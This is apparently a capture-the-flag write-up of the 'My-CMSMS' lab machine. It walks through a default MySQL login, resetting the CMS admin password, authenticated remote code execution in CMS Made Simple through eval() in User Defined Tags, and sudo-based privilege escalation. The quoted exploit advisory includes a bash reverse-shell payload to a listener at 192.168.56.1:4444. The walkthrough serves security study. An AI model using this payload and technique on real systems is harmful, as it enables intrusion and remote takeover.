# My-CMSMS | Aug 25, 2022

## Background

> Webapps and concats 

- Author: [Pankaj Verma](https://www.vulnhub.com/entry/my-cmsms-1,498/)

- Released on: Aug 25, 2020

- Difficulty: Intermediate

- Overall difficulty for me: Easy
	- Initial foothold: Easy
	- Privilege Escalation: Very easy

# Service Enumeration

As usual, scan the machine for open ports via `rustscan`!

**Rustscan Result:**

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Proving-Grounds-Play/My-CMSMS/images/a1.png)

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Proving-Grounds-Play/My-CMSMS/images/a2.png)

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Proving-Grounds-Play/My-CMSMS/images/a3.png)

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Proving-Grounds-Play/My-CMSMS/images/a4.png)

According to `rustscan` result, we have 4 ports are opened:

Ports Open        | Service
------------------|------------------------
22                | OpenSSH 7.9p1 Debian
80                | Apache httpd 2.4.38
3306              | MySQL
33060             | MySQL??

## HTTP on Port 80

Always enumerate HTTP first, as it has the largest attack vectors.

**http://192.168.129.74/index.php:**

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Proving-Grounds-Play/My-CMSMS/images/a5.png)

Found **`CMS Made Simple version 2.2.13`**.

**Searchsploit Result:**

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Proving-Grounds-Play/My-CMSMS/images/a6.png)

Nothing useful... As we're not authenticated.

## MySQL on Port 3306

Rarely MySQL will be exposed externally... Let's look at this service. I'll guess the password first:

- MySQL Username:root
- MySQL Password:root

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Proving-Grounds-Play/My-CMSMS/images/a7.png)

Nice password. :D

**Let's enumerate all the databases:**

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Proving-Grounds-Play/My-CMSMS/images/a8.png)

Found `cmsms_db` database, which is not a default database for MySQL.

**cmsms_db:**

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Proving-Grounds-Play/My-CMSMS/images/a9.png)

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Proving-Grounds-Play/My-CMSMS/images/a10.png)

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Proving-Grounds-Play/My-CMSMS/images/a11.png)

**The `cms_users` table seems interesting, let's look at that:**

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Proving-Grounds-Play/My-CMSMS/images/a12.png)

Found `admin` password hash.

Since we have remote access to the database, we can **just change `admin`'s password hash!**

According to the [CMSMS offical blog](https://cmscanbesimple.org/blog/cms-made-simple-admin-password-recovery), we can change an user's password with the following SQL syntax:

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Proving-Grounds-Play/My-CMSMS/images/a15.png)

Let's change `admin`'s password!

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Proving-Grounds-Play/My-CMSMS/images/a13.png)

Now we should able to login to the `admin` account!

- Username:admin
- Password:pwnedpassword

# Initial Foothold

**Login as admin from http://192.168.129.74/admin/:**

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Proving-Grounds-Play/My-CMSMS/images/a14.png)

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Proving-Grounds-Play/My-CMSMS/images/a16.png)

I'm in!

Since I'm authenticated, those RCE(Remote Code Execution) exploits that we previously found via `searchsploit` would works!

Let's use the `CMS Made Simple 2.2.15 - RCE (Authenticated)` one:

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Proving-Grounds-Play/My-CMSMS/images/a17.png)

**49345.txt:**
```
Vulnerability is present at "editusertag.php" at line #93 where the user input is in eval() PHP function.

// Vulnerable eval() code

if (eval('function testfunction'.rand().'() {'.$code."\n}") === FALSE) {

Reproduction Steps:

1. Login as administrator user and navigate to Extensions->User Defined Tags

2. Add code with the payload of:
exec("/bin/bash -c 'bash -i > /dev/tcp/192.168.56.1/4444 0>&1'");

3. Click on the newly created User Defined Tag and use the Run function

RCE will be achieved:

astoykov@Lubuntu:~$ nc -kvlp 4444
nc: getnameinfo: Temporary failure in name resolution
Connection received on 192.168.56.132 53690
id
uid=1(daemon) gid=1(daemon) groups=1(daemon)
```

We can follow it's step to gain an initial shell:

- Go to "Extensions" -> "User Defined Tags", and add code with Bash reverse shell:

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Proving-Grounds-Play/My-CMSMS/images/a18.png)

- Click on the newly created "User Defined Tag":

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Proving-Grounds-Play/My-CMSMS/images/a19.png)

- Setup a `nc` listener and use the "Run" function:

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Proving-Grounds-Play/My-CMSMS/images/a20.png)

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Proving-Grounds-Play/My-CMSMS/images/a21.png)

I'm `www-data`!

**local.txt:**

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Proving-Grounds-Play/My-CMSMS/images/a22.png)

**Stable Shell via `socat`:**

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Proving-Grounds-Play/My-CMSMS/images/a23.png)

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Proving-Grounds-Play/My-CMSMS/images/a24.png)

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Proving-Grounds-Play/My-CMSMS/images/a25.png)

# Privilege Escalation

## www-data to armour

In the home directory of the `armour` user, there is a SUID bit set Bash script:

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Proving-Grounds-Play/My-CMSMS/images/a26.png)

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Proving-Grounds-Play/My-CMSMS/images/a27.png)

But we can't escalate to root via this script. Nice rabbit hole, caught me off guard a little bit.

In `/var/www/html`, there is a file called `.htpasswd`:

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Proving-Grounds-Play/My-CMSMS/images/a28.png)

Which looks like `base64`. Let's decode it:

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Proving-Grounds-Play/My-CMSMS/images/a29.png)

Found credentials!

- Username:armour
- Password:Shield@123

Let's **Switch User** to `armour`!

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Proving-Grounds-Play/My-CMSMS/images/a30.png)

And I'm `armour`.

## armour to root

**Sudo Permission:**

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Proving-Grounds-Play/My-CMSMS/images/a31.png)

`armour` is able to run `python` as root without password, which can be abused to escalate our privilege to root!

**Let's spawn a PTY bash shell with root privilege:**

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Proving-Grounds-Play/My-CMSMS/images/a32.png)

And I'm root! :D

# Rooted

**proof.txt:**

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Proving-Grounds-Play/My-CMSMS/images/a33.png)

# Conclusion

What we've learned:

1. Modifying Databases via Exposed MySQL Service
2. Exploiting `eval()` PHP Function
3. Privilege Escalation via Found Credentials From Hidden File (`.htpasswd`)
4. Privilege Escalation via misconfigured `sudo` Permission